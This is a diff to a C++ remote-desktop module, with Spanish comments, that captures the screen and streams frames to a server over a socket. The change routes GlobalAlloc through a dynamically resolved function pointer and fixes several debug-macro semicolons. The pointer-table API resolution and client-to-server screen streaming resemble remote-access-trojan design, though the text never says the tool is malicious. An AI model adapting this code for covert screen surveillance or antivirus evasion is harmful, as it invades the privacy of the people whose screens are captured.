@@ -247,11 +247,12 @@ void mod_RemoteDesktop::m_UpdateQuality(int iNew) {
     this->uQuality = iNew == 0 ? 32 : static_cast<ULONG>(iNew);
 }
 
-mod_RemoteDesktop::mod_RemoteDesktop(st_User32_RD& _user32, st_Gdi32& _gdi32, st_GdiPlus& _gdiplus, st_Ole32& _ole32) {
+mod_RemoteDesktop::mod_RemoteDesktop(st_User32_RD& _user32, st_Gdi32& _gdi32, st_GdiPlus& _gdiplus, st_Ole32& _ole32, st_Kernel32& _kernel32) {
     this->USER32 = _user32;
     this->GDI32 = _gdi32;
     this->GDIPLUS = _gdiplus;
     this->OLE32 = _ole32;
+    this->KERNEL32 = _kernel32;
 
     this->InitGDI();
     
@@ -279,7 +280,7 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
         !this->GDI32.pSelectObject || !this->GDI32.pGetObjectA || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal ||
         !this->USER32.pGetWindowRect || !this->GDIPLUS.pGdipCreateBitmapFromHBITMAP ||
         !this->GDIPLUS.pGdipCreateBitmapFromStream ||
-        !this->GDI32.pDeleteDC || !this->GDI32.pDeleteObject || !this->USER32.pGetDC || !this->USER32.pGetDesktopWindow) {
+        !this->GDI32.pDeleteDC || !this->GDI32.pDeleteObject || !this->USER32.pGetDC || !this->USER32.pGetDesktopWindow || !this->KERNEL32.pGlobalAlloc) {
         __DBG_("[RD][X][getFrameBitmap]No se cargaron todas las funciones");
         return outBitmap;
     }
@@ -318,7 +319,7 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
     BITMAP bmpCursor = { 0 };
     
 
-    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
+    HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
     if (hGlobalMem == NULL) {
         error_2("[RD][X] getFrameBitmap GlobalAlloc error");
@@ -563,7 +564,7 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
                 UINT n_width = 0, n_height = 0;
                 if (this->GDIPLUS.pGdipGetImageHeight(newBitmap, &n_height) != GpStatus::Ok ||
                     this->GDIPLUS.pGdipGetImageWidth(newBitmap, &n_width) != GpStatus::Ok) {
-                    __DBG_("[RD][X] IniciarLive Error obteniendo dimenciones del nuevo bitmap")
+                    __DBG_("[RD][X] IniciarLive Error obteniendo dimenciones del nuevo bitmap");
                     this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
                     continue;
                 }
@@ -623,7 +624,7 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
                 this->pixelSerialize(vcPixels, vcData);
                 int iSent = cCliente->cChunkSend(cCliente->sckSocket, vcData.data(), vcData.size(), 0, true, nullptr, EnumComandos::RD_Salida_Pixel);
                 if (iSent == -1) {
-                    __DBG_("[RD][X] IniciarLive cChunkSend(Pixels): Error enviando el paquete al servidor")
+                    __DBG_("[RD][X] IniciarLive cChunkSend(Pixels): Error enviando el paquete al servidor");
                     break;
                 }
             }else {
@@ -631,7 +632,7 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
                 std::vector<char> imgBuffer = this->getBitmapBytes(oldBitmap, this->m_Quality());
                 int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
                 if (iSent == -1) {
-                    __DBG_("[RD][X] IniciarLive cChunkSend(Full frame): Error enviando el paquete al servidor")
+                    __DBG_("[RD][X] IniciarLive cChunkSend(Full frame): Error enviando el paquete al servidor");
                     break;
                 }
             }
@@ -659,7 +660,7 @@ void mod_RemoteDesktop::EnviarCaptura(ULONG quality, int monitor_index) {
             if (iRet == -1) {
                 __DBG_("[RD][X] EnviarCaptura No se puedo enviar la captura de pantalla");
             }else {
-                __DBG_("[RD][X] EnviarCaptura Captura enviada")
+                __DBG_("[RD][X] EnviarCaptura Captura enviada");
             }
         }else {
             __DBG_("[RD][X] EnviarCaptura El buffer de remote_desk es 0");
